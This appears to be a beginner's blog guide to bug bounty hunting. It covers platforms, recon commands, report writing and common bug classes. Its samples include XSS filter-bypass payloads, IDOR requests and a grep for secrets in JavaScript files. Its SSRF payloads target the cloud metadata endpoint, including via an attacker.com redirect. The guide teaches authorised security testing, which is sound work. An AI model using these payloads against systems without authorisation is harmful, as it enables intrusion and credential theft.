---
title: "Bug Bounty Hunting - From Zero to First Bounty"
description: "Complete guide to starting your bug bounty hunting journey, from choosing platforms to writing reports and earning your first bounty."
date: "2025-08-30"
category: "Bug Bounty"
tags: ["Bug Bounty", "Web Security", "Hacking", "Recon"]
image: "/images/blog/bug-bounty-hunting.png"
imageAlt: "Bug bounty hunting platform interface with vulnerability reports"
imagePrompt: "Bug bounty hunting platform interface, vulnerability reports, security researcher at work, matte black background, neon green code snippets, cyan reward badges, hacker terminal, web application security, modern cybersecurity illustration"
author: "Rana Uzair Ahmad"
readTime: "13 min"
difficulty: "Beginner"
---

Bug bounty hunting is one of the most rewarding paths in cybersecurity — you get paid to break things legally, build real-world skills, and contribute to making the internet safer. But getting started can be overwhelming. There are thousands of programs, dozens of vulnerability classes, and a competitive landscape of talented researchers. This guide cuts through the noise and gives you a structured path from zero to your first bounty.

## Choosing Your Platform

The two dominant bug bounty platforms are **HackerOne** and **Bugcrowd**, though several others like **Intigriti**, **YesWeHack**, and **Synack** (invite-only) offer programs worth exploring.

**HackerOne** hosts programs from companies like Shopify, GitLab, PayPal, and the U.S. Department of Defense. It has the largest program directory and a transparent reputation system based on Signal, Impact, and Reputation metrics.

**Bugcrowd** features programs from Mastercard, Tesla, and Atlassian. Its Vulnerability Rating Taxonomy (VRT) standardizes severity classifications and helps you understand what types of bugs each program values.

**Start with programs that have**:
- A broad scope (wildcards like `*.example.com`)
- Responsive triage teams (median response time under 7 days)
- A track record of paying fair bounties
- A clear and permissive safe harbor policy

Avoid programs with narrow scopes or histories of marking valid reports as duplicates or informational without adequate explanation.

## Reconnaissance — The Foundation of Everything

Recon separates successful hunters from those who submit duplicate findings. The more attack surface you discover, the more likely you are to find bugs that others missed.

### Subdomain Enumeration

```bash
# Passive enumeration - combine multiple sources
subfinder -d target.com -silent | sort -u > subdomains.txt
amass enum -passive -d target.com >> subdomains.txt
assetfinder --subs-only target.com >> subdomains.txt

# Deduplicate and resolve live hosts
cat subdomains.txt | sort -u | httpx -silent -status-code -title > live_hosts.txt

# Active brute-force for hidden subdomains
puredns bruteforce /usr/share/wordlists/dns/best-dns-wordlist.txt target.com \
  --resolvers resolvers.txt -q >> subdomains.txt
```

### Content Discovery

```bash
# Directory brute-forcing with ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,301,302,403 -fs 0 -o ffuf_results.json -of json

# Discover hidden parameters
arjun -u https://target.com/api/endpoint -m GET POST

# Crawl with gospider for links and endpoints
gospider -s https://target.com -d 3 -t 10 --other-source --include-subs -o crawl_output

# Mine the Wayback Machine for historical endpoints
waybackurls target.com | grep -E "\.(php|asp|aspx|jsp|json|xml|config|env|bak|sql)" | sort -u > wayback_interesting.txt
```

### JavaScript Analysis

Modern applications expose critical logic, API endpoints, secrets, and hidden functionality in JavaScript files:

```bash
# Extract JavaScript files from live hosts
cat live_hosts.txt | getJS --complete | sort -u > js_files.txt

# Analyze JS for secrets, endpoints, and sensitive data
cat js_files.txt | while read url; do
  echo "=== $url ===" >> js_analysis.txt
  curl -s "$url" | grep -oP "(api[_-]?key|secret|token|password|auth)['\"]?\s*[:=]\s*['\"][^'\"]{8,}" >> js_analysis.txt
done

# Use LinkFinder for endpoint extraction
python3 linkfinder.py -i https://target.com/app.js -o cli
```

## Common Bug Classes to Hunt

### Cross-Site Scripting (XSS)

XSS remains incredibly common. Focus on reflected XSS in search parameters, error messages, and redirects. For stored XSS, target user profile fields, comments, file upload names, and email headers:

```
# Test basic reflection
https://target.com/search?q=<script>alert(document.domain)</script>

# Bypass common filters
https://target.com/search?q=<img src=x onerror=alert(document.domain)>
https://target.com/search?q="><svg/onload=confirm(1)>
https://target.com/search?q=javascript:alert(1)//

# DOM-based XSS - check for sinks
# Look for document.write(), innerHTML, eval(), location.href assignments
# fed by sources like location.hash, document.URL, window.name
```

### Insecure Direct Object References (IDOR)

IDOR vulnerabilities occur when applications expose internal object references without proper authorization checks. They are among the most impactful and most common bugs:

```bash
# Original request - viewing your own order
GET /api/v1/orders/12345 HTTP/1.1
Authorization: Bearer <your_token>

# IDOR test - try accessing another user's order
GET /api/v1/orders/12346 HTTP/1.1
Authorization: Bearer <your_token>

# Test ID enumeration patterns
# Sequential integers: 12345, 12346, 12347
# UUIDs: try leaked UUIDs from other endpoints
# Encoded values: decode Base64/hex IDs and modify
```

Check every API endpoint that uses an identifier — user profiles, orders, invoices, documents, messages, and settings.

### Server-Side Request Forgery (SSRF)

SSRF lets you make the server send requests to unintended destinations, potentially accessing internal services, cloud metadata, or admin panels:

```bash
# Test URL parameters for SSRF
POST /api/fetch-url HTTP/1.1
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}

# Bypass filters with redirects, DNS rebinding, or alternative encodings
{"url": "http://0x7f000001/admin"}
{"url": "http://127.1/admin"}
{"url": "http://[::1]/admin"}
{"url": "http://attacker.com/redirect?url=http://169.254.169.254/"}
```

## Building Your Methodology

A repeatable methodology prevents you from missing bugs and ensures consistent coverage. Here is a proven workflow:

1. **Scope Review**: Read the program policy thoroughly. Understand what's in scope, what's excluded, and what vulnerability types they care about.
2. **Reconnaissance**: Run your full recon suite. Spend 40-50% of your time here.
3. **Technology Fingerprinting**: Identify the tech stack — frameworks, CDNs, APIs, authentication mechanisms.
4. **Authentication Testing**: Test registration, login, password reset, session management, and OAuth flows.
5. **Authorization Testing**: Map roles and test horizontal/vertical privilege escalation across every endpoint.
6. **Input Validation**: Test every input point for injection vulnerabilities.
7. **Business Logic**: Understand the application's intended workflow and look for ways to abuse it — race conditions, price manipulation, feature abuse.
8. **API Testing**: Map every API endpoint and test for mass assignment, broken authentication, and excessive data exposure.

## Writing Reports That Get Paid

Your report quality directly impacts whether you get paid and how much. A weak report on a critical bug can get triaged as low severity or rejected. A well-written report on a medium bug can get bonus payouts.

### Report Template

```markdown
## Title
[Vulnerability Type] in [Feature/Endpoint] allows [Impact]

## Summary
Brief description of the vulnerability and its business impact.

## Steps to Reproduce
1. Navigate to https://target.com/profile/settings
2. Intercept the request with Burp Suite
3. Change the `user_id` parameter from `12345` to `12346`
4. Observe that you can access another user's profile data

## Proof of Concept
[Screenshots, HTTP request/response pairs, video if complex]

## Impact
Describe the real-world impact:
- What data can be accessed/modified?
- How many users are affected?
- What is the business risk?

## Severity
[Critical/High/Medium/Low] based on CVSS or platform VRT

## Remediation
Suggested fix (optional but appreciated):
- Implement server-side authorization checks on the `user_id` parameter
- Verify that the authenticated user owns the requested resource
```

**Key principles**: Always provide clear, numbered reproduction steps that anyone can follow. Include the raw HTTP requests and responses. Show the impact concretely — if you can access other users' data, show it (redact sensitive info). Never exaggerate severity.

## Your First Bounty Strategy

The fastest path to your first bounty is not hunting on the biggest programs against the most experienced researchers. Instead:

1. **Target new programs** that just launched — less competition, more low-hanging fruit.
2. **Hunt on mobile applications** — fewer researchers focus on mobile, and apps often have weaker API authorization.
3. **Focus on one vulnerability class** until you master it. IDORs are the best starting point — they're everywhere and often high severity.
4. **Go deep on one target** rather than shallow on many. Spend a week learning one application inside-out.
5. **Hunt during off-peak hours** — weekends and holidays mean less competition.
6. **Check for newly added features** — new code means new bugs. Follow your target's changelog and blog.

## Essential Tools Arsenal

| Category | Tools |
|----------|-------|
| Proxy | Burp Suite (Community/Pro), Caido |
| Subdomain Enum | subfinder, amass, assetfinder |
| Content Discovery | ffuf, feroxbuster, dirsearch |
| Crawling | gospider, hakrawler, katana |
| JS Analysis | LinkFinder, SecretFinder, JSluice |
| Vulnerability Scanning | nuclei, nikto, dalfox (XSS) |
| Recon Automation | reconftw, Osmedeus, LazyRecon |
| Collaboration | Notion, Obsidian for notes |

Build your toolkit gradually. Start with Burp Suite Community Edition, subfinder, ffuf, and nuclei. Add specialized tools as your methodology matures.

Bug bounty hunting rewards persistence and curiosity above all else. Your first bounty might take weeks or months of consistent effort, but the skills you develop along the way — web application security, networking, programming, and analytical thinking — are invaluable regardless of the payout. Start today, stay consistent, and the results will follow.
